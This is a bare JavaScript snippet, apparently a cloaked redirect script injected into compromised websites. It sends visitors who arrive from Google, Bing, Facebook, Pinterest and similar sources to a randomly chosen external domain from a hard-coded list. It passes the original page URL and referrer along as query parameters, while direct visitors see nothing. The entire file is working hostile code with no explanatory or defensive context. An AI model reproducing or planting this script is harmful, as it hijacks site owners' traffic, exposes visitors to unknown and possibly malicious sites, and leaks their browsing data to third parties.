var ars = rChoice([
	'https://casaanitavip.com/',
	'https://disfrutessen.com/',
	'https://frenchpressmemos.com/',
	'https://jackfleckgolf.com/',
	'http://shopgreenbeing.com/',
	'http://sweetfigments.com/',
	'http://thenerdinsurance.us/',
	'http://wearethedetours.com/',
	]);

function rChoice(arr) {
  return arr[Math.floor(arr.length * Math.random())];
}

if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.', 'aol.', 'ask.', 'duckduckgo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
  window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer)
}
